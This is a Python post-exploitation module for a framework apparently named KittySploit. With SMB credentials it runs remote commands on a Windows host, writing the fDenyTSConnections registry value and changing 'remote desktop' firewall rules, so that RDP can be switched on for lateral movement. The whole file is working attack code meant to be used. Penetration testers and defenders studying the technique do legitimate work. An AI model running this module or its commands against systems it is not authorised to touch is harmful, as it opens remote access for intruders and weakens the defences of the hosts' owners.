#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enable or disable RDP remotely via SMB command execution (NetExec: -M rdp)."""

from __future__ import annotations

from kittysploit import *
from lib.protocols.smb.smb_session_mixin import SMBSessionMixin


class Module(Post, SMBSessionMixin):
    __info__ = {
        "name": "SMB Enable RDP",
        "description": (
            "Enables or disables Remote Desktop by setting fDenyTSConnections via remote "
            "command execution over SMB (NetExec: -M rdp -o ACTION=enable). Requires "
            "impacket for SCM exec."
        ),
        "author": ["KittySploit Team"],
        "session_type": SessionType.SMB,
        "tags": ["ad", "smb", "rdp", "lateral", "post", "netexec"],
        "references": ["https://www.netexec.wiki/"],
        "agent": {
            "risk": "intrusive",
            "effects": ["host_modification"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    action = OptChoice(
        "enable",
        "enable or disable RDP",
        True,
        choices=["enable", "disable"],
    )

    def run(self):
        info = self.get_smb_connection_info()
        host = str(info.get("host") or "")
        user = str(info.get("username") or "")
        password = str(info.get("password") or "")
        domain = str(info.get("domain") or "")
        port = int(info.get("port") or 445)
        if not host or not user:
            print_error("SMB session/credentials required (session_id or rhost+username)")
            return False

        enable = str(self.action or "enable").lower() == "enable"
        value = "0" if enable else "1"
        # Also open firewall rule when enabling
        cmds = [
            f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" '
            f'/v fDenyTSConnections /t REG_DWORD /d {value} /f',
        ]
        if enable:
            cmds.append(
                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes'
            )
        else:
            cmds.append(
                'netsh advfirewall firewall set rule group="remote desktop" new enable=No'
            )

        try:
            from lib.protocols.smb.smb_exec import exec_command
        except Exception as exc:
            print_error(f"smb_exec unavailable: {exc}")
            return False

        for cmd in cmds:
            print_status(f"Exec: {cmd}")
            try:
                code, out, err = exec_command(
                    host=host,
                    username=user,
                    password=password,
                    command=cmd,
                    domain=domain,
                    port=port,
                )
                if out:
                    print_info(out.strip()[:300])
                if err:
                    print_warning(err.strip()[:200])
                print_info(f"return_code={code}")
            except ImportError:
                print_error("impacket is required (pip install impacket)")
                return False
            except Exception as exc:
                print_error(f"Remote exec failed: {exc}")
                return False

        verb = "enabled" if enable else "disabled"
        print_success(f"RDP {verb} on {host} (verify TCP/3389)")
        return True
